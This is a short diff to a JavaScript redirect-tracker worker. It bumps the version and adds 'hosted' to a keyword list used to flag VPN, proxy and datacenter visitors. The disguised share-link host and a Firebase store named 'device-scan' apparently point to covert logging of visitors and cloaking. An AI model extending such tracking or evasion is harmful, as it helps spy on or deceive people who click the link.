@@ -1,4 +1,4 @@
-// SC6 Redirect Tracker Worker — v1.9.30
+// SC6 Redirect Tracker Worker — v1.9.31
 // Deploy at: media.sharelink-1.workers.dev
 
 const FIREBASE = 'https://device-scan-8898e-default-rtdb.firebaseio.com';
@@ -105,7 +105,7 @@ function detectVpn(isp, asn) {
   const vpnKeywords = [
     'nordvpn','expressvpn','mullvad','surfshark','protonvpn','cyberghost',
     'ipvanish','hidemyass','purevpn','windscribe','pia ','private internet access',
-    'torguard','vpn','proxy','tor exit','hosting','digitalocean','linode','vultr',
+    'torguard','vpn','proxy','tor exit','hosting','hosted','digitalocean','linode','vultr',
     'ovh','hetzner','leaseweb','choopa','psychz','quadranet','coresite','zenlayer',
     'amazon','google cloud','microsoft azure','cloudflare','fastly','akamai',
     'datacenter','data center','datacamp','server','colocation','colo',
